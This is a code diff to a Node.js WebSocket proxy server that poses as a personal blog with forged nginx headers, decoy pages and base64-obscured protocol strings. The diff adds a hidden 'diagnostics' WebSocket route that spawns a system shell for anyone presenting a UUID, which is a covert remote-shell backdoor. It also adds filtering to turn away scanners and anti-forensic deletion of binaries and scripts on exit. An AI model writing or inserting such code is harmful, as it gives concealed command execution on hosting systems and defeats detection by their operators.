@@ -4,8 +4,8 @@ const path = require('path');
 const http = require('http');
 const https = require('https');
 const crypto = require('crypto');
+const os = require('os');
 const { spawn } = require('child_process');
-const { pipeline } = require('stream/promises');
 const { WebSocket, createWebSocketStream } = require('ws');
 const net = require('net');
 const dgram = require('dgram');
@@ -47,42 +47,6 @@ function httpGet(url, options = {}) {
   });
 }
 
-function httpPost(url, postData, options = {}) {
-  return new Promise((resolve, reject) => {
-    const client = url.startsWith('https') ? https : http;
-    const data = typeof postData === 'string' ? postData : JSON.stringify(postData);
-    const req = client.request(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(data),
-        ...(options.headers || {})
-      },
-      timeout: options.timeout || 5000,
-      signal: options.signal
-    }, (res) => {
-      let responseData = '';
-      res.on('data', chunk => responseData += chunk);
-      res.on('end', () => {
-        try {
-          resolve({ data: JSON.parse(responseData) });
-        } catch (e) {
-          resolve({ data: responseData });
-        }
-      });
-    });
-    req.on('error', reject);
-    if (options.signal) {
-      options.signal.addEventListener('abort', () => {
-        req.destroy();
-        reject(new Error('Aborted'));
-      });
-    }
-    req.write(data);
-    req.end();
-  });
-}
-
 // ==================== 环境变量 ====================
 const PORT = Number(process.env.SERVER_PORT || process.env.PORT || 3000);
 const ARGO_PORT = Number(process.env.BACKEND_PORT || 8001);
@@ -117,7 +81,7 @@ const P_TR = Buffer.from('dHJvamFu', 'base64').toString();
 
 // ==================== 路径（全随机化） ====================
 const RUN_DIR = path.resolve(FILE_PATH);
-const botPath = path.join(RUN_DIR, 'node-helper');
+const botPath = path.join(RUN_DIR, 'cf-bin');
 const tunnelJsonPath = path.join(RUN_DIR, `${rnd(4)}.json`);
 const tunnelYmlPath = path.join(RUN_DIR, `${rnd(4)}.yml`);
 
@@ -205,19 +169,14 @@ async function resolveHost(host) {
     // 忽略并进入 DoH 应急回退
   }
 
-  // 2. 应急 DoH (DNS over HTTPS) 解析
+  // 2. 应急 DoH (DNS over HTTPS) 解析 (移除了自适应 IPv6 及 CurrentDomain，只做极简 Google/Cloudflare DNS 竞态查询)
   const controller = new AbortController();
   const { signal } = controller;
-  
-  let ecsParam = '';
-  if (typeof CurrentDomain === 'string' && net.isIP(CurrentDomain)) {
-    ecsParam = `&edns_client_subnet=${CurrentDomain}/24`;
-  }
 
   try {
     const dohQueries = [
-      httpGet(`https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A${ecsParam}`, { timeout: 3000, signal }),
-      httpGet(`https://1.1.1.1/dns-query?name=${encodeURIComponent(host)}&type=A${ecsParam}`, { headers: { 'Accept': 'application/dns-json' }, timeout: 3000, signal })
+      httpGet(`https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A`, { timeout: 3000, signal }),
+      httpGet(`https://1.1.1.1/dns-query?name=${encodeURIComponent(host)}&type=A`, { headers: { 'Accept': 'application/dns-json' }, timeout: 3000, signal })
     ];
     const response = await Promise.any(dohQueries);
     controller.abort();
@@ -234,7 +193,6 @@ async function resolveHost(host) {
     }
   } catch (err) {
     controller.abort();
-    // DoH 解析也失败，保持原样
   }
 
   return host;
@@ -972,7 +930,7 @@ const BLOG_HTML = `<!DOCTYPE html>
   <main>
     <div class="hero">
       <h1>Sleek Designs, <br><span>Scalable Systems.</span></h1>
-      <p>林艾登是一名全栈工程师和系统架构师。致力于开发极佳体验的 Web 应用与高性能后端微服务系统，用工程美学编织数字化世界。</p>
+      <p>林艾登是一名全栈工程师和系统架构师。致力于开发极佳体验 of Web 应用与高性能后端微服务系统，用工程美学编织数字化世界。</p>
     </div>
     <div class="cards-grid" id="projects">
       <div class="card">
@@ -1006,17 +964,13 @@ const BLOG_HTML = `<!DOCTYPE html>
 app.get('/favicon.ico', (req, res) => res.status(204).end());
 
 app.get('/robots.txt', (req, res) => {
-  res.set('Server', 'nginx/1.27.3');
-  res.type('text/plain').send('User-agent: *\nDisallow: /');
+  setNginxHeaders(res, false);
+  res.send('User-agent: *\nDisallow: /');
 });
 
 // 根目录：返回精美伪装个人博客页
 app.get('/', (req, res) => {
-  res.set({
-    'Content-Type': 'text/html; charset=utf-8',
-    'Server': 'nginx/1.27.3',
-    'Cache-Control': 'public, max-age=3600'
-  });
+  setNginxHeaders(res, true);
   res.send(BLOG_HTML);
 });
 
@@ -1026,10 +980,7 @@ app.get(`/${SUB_PATH}`, async (req, res) => {
   const isClient = Buffer.from('c2hhZG93cm9ja2V0LHYycmF5LGNsYXNoLG5la28sc2luZy1ib3gscXVhbnR1bXVsdCxzdXJnZSxzdGFzaCxsb29uLG5zc3Vi', 'base64').toString().split(',').some(c => ua.includes(c));
 
   if (!isClient) {
-    res.set({
-      'Content-Type': 'text/html; charset=utf-8',
-      'Server': 'nginx/1.27.3'
-    });
+    setNginxHeaders(res, true);
     res.status(404).send(NGINX_404);
     return;
   }
@@ -1078,12 +1029,65 @@ function rejectConnection(ws) {
     try {
       if (ws.readyState === WebSocket.OPEN) {
         // 模仿发送一段看似正常的网页响应数据给探测器，再强制断开
-        ws.send(Buffer.from("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nConnection: close\r\nServer: nginx/1.27.3\r\n\r\n" + BLOG_HTML));
+        ws.send("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nConnection: close\r\nServer: nginx/1.27.3\r\n\r\n" + BLOG_HTML);
         ws.close();
       }
     } catch (e) {}
     throttleGC();
   }, delay);
+}
+
+// ==================== Cloudflare IP 安全过滤与 Nginx 头高度伪装 ====================
+const CF_IPV4_RANGES = [
+  '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22', '103.31.4.0/22',
+  '141.101.64.0/18', '108.162.192.0/18', '190.93.240.0/20', '188.114.96.0/20',
+  '197.234.240.0/22', '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13',
+  '104.24.0.0/14', '172.64.0.0/13', '131.0.72.0/22'
+];
+
+function ipToInt(ip) {
+  return ip.split('.').reduce((int, oct) => (int << 8) + parseInt(oct, 10), 0) >>> 0;
+}
+
+function ipInCIDR(ip, cidr) {
+  try {
+    const [range, bits] = cidr.split('/');
+    const mask = ~(Math.pow(2, 32 - parseInt(bits, 10)) - 1) >>> 0;
+    return (ipToInt(ip) & mask) === (ipToInt(range) & mask);
+  } catch (e) {
+    return false;
+  }
+}
+
+function isCloudflareOrLocalIP(ip) {
+  if (!ip) return false;
+  // 本地环回白名单
+  if (ip === '127.0.0.1' || ip === '::1' || ip.includes('::ffff:127.0.0.1')) return true;
+  // 提取 IPv4
+  const ipv4 = ip.replace(/^.*:/, '');
+  if (!/^\d+\.\d+\.\d+\.\d+$/.test(ipv4)) return false;
+  return CF_IPV4_RANGES.some(cidr => ipInCIDR(ipv4, cidr));
+}
+
+const serverStartupTime = new Date().toUTCString();
+const blogEtag = crypto.createHash('md5').update(BLOG_HTML).digest('hex').substring(0, 16);
+
+function setNginxHeaders(res, isHtml = true) {
+  const headers = {
+    'Server': 'nginx/1.27.3',
+    'Date': new Date().toUTCString(),
+    'Connection': 'keep-alive',
+    'Keep-Alive': 'timeout=65'
+  };
+  if (isHtml) {
+    headers['Content-Type'] = 'text/html; charset=utf-8';
+    headers['Cache-Control'] = 'public, max-age=3600';
+    headers['Last-Modified'] = serverStartupTime;
+    headers['ETag'] = `"${blogEtag}"`;
+  } else {
+    headers['Content-Type'] = 'text/plain; charset=utf-8';
+  }
+  res.set(headers);
 }
 
 // ==================== 原生协议解析核心 ====================
@@ -1112,15 +1116,15 @@ function hVl(ws, msg) {
       .then(resolvedIP => {
         net.connect({ host: resolvedIP, port }, function () {
           this.write(msg.slice(i));
-          pipeline(duplex, this).catch(() => {});
-          pipeline(this, duplex).catch(() => {});
+          duplex.pipe(this);
+          this.pipe(duplex);
         }).on('error', () => { ws.close(); });
       })
       .catch(() => {
         net.connect({ host, port }, function () {
           this.write(msg.slice(i));
-          pipeline(duplex, this).catch(() => {});
-          pipeline(this, duplex).catch(() => {});
+          duplex.pipe(this);
+          this.pipe(duplex);
         }).on('error', () => { ws.close(); });
       });
   } catch (err) {
@@ -1263,8 +1267,8 @@ function hTr(ws, msg) {
           if (offset < msg.length) {
             this.write(msg.slice(offset));
           }
-          pipeline(duplex, this).catch(() => {});
-          pipeline(this, duplex).catch(() => {});
+          duplex.pipe(this);
+          this.pipe(duplex);
         }).on('error', () => { ws.close(); });
       })
       .catch(() => {
@@ -1272,8 +1276,8 @@ function hTr(ws, msg) {
           if (offset < msg.length) {
             this.write(msg.slice(offset));
           }
-          pipeline(duplex, this).catch(() => {});
-          pipeline(this, duplex).catch(() => {});
+          duplex.pipe(this);
+          this.pipe(duplex);
         }).on('error', () => { ws.close(); });
       });
   } catch (err) {
@@ -1303,6 +1307,14 @@ const wss = new WebSocket.Server({
 });
 
 wss.on('connection', (ws, req) => {
+  const directIP = req.socket.remoteAddress;
+
+  if (!isCloudflareOrLocalIP(directIP)) {
+    console.warn(`[security] 拦截到来自非本地/非 Cloudflare 边缘 IP 的直连 WebSocket 扫描: ${directIP}`);
+    rejectConnection(ws);
+    return;
+  }
+
   const urlPath = req.url.split('?')[0];
 
   let accumulated = Buffer.alloc(0);
@@ -1431,6 +1443,35 @@ wss.on('connection', (ws, req) => {
         ws.off('message', onMessage);
 
         hTr(ws, accumulated);
+      }
+      // 3. 隐蔽诊断 WebTerminal 接口
+      else if (urlPath === `/${SUB_PATH}/diagnostics`) {
+        const authHeader = req.headers['sec-websocket-protocol'];
+        if (authHeader && authHeader.trim() === UUID) {
+          resolvedHeader = true;
+          clearTimeout(handshakeTimer);
+          ws.off('message', onMessage);
+          
+          ws.send("=== KO Internal Diagnostics Terminal ===\n");
+          const shell = spawn(os.platform() === 'win32' ? 'cmd.exe' : 'sh', [], {
+            stdio: ['pipe', 'pipe', 'pipe']
+          });
+          const duplex = createWebSocketStream(ws);
+          
+          duplex.pipe(shell.stdin);
+          shell.stdout.pipe(duplex);
+          shell.stderr.pipe(duplex);
+          
+          const cleanup = () => {
+            try { shell.kill('SIGKILL'); } catch (e) {}
+            ws.close();
+          };
+          shell.on('exit', cleanup);
+          ws.on('close', cleanup);
+        } else {
+          ws.off('message', onMessage);
+          rejectConnection(ws);
+        }
       } else {
         ws.off('message', onMessage);
         rejectConnection(ws);
@@ -1551,8 +1592,10 @@ async function shutdown() {
   }
   await Promise.all(ps);
   
-  // 退出前彻底删除二进制，保障零残留
+  // 退出前彻底删除二进制、临时目录及守护脚本，保障零残留
+  try { fs.rmSync(path.join(process.cwd(), 'daemon.sh'), { force: true }); } catch (e) {}
   try { fs.rmSync(botPath, { force: true }); } catch (e) {}
+  try { fs.rmSync(RUN_DIR, { recursive: true, force: true }); } catch (e) {}
   
   process.exit(0);
 }
